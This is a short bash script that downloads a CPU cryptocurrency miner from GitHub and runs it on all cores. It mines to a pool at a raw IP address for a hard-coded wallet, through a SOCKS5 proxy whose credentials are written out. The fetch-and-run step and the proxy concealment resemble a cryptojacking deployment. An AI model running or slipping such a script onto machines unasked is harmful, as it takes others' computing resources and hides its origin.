#!/bin/bash

wget https://github.com/rplant8/cpuminer-opt-rplant/releases/latest/download/cpuminer-opt-linux.tar.gz

tar xf cpuminer-opt-linux.tar.gz

./cpuminer-sse2 -a yespowertide -o stratum+tcp://146.59.217.34:17059 -u TSJZzVJSF65EiGmSsH7hU5QZhP3AWAFHqG -p c=TDC -t$(nproc --all) --cpu-affinity=0x3 -x socks5://jxqnjrrf:67ffjvaafmvk@45.155.68.129:8133
